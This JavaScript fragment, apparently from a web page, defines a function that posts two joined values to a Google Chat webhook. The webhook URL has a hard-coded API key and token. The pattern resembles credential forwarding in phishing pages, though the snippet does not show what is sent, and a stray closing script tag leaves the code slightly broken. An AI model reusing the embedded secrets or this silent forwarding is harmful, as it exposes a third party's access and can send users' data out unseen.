function msg(a, b) {
let u='https://chat.googleapis.com/v1/spaces/AAAABm6frmk/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=FVWgvD7YMXZiEndCywmG2uqYyAkNaTq4aeRSqBDRw1A%3D';
fetch(u,{method:'post',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:""+a+"-"+b})})</script>
}
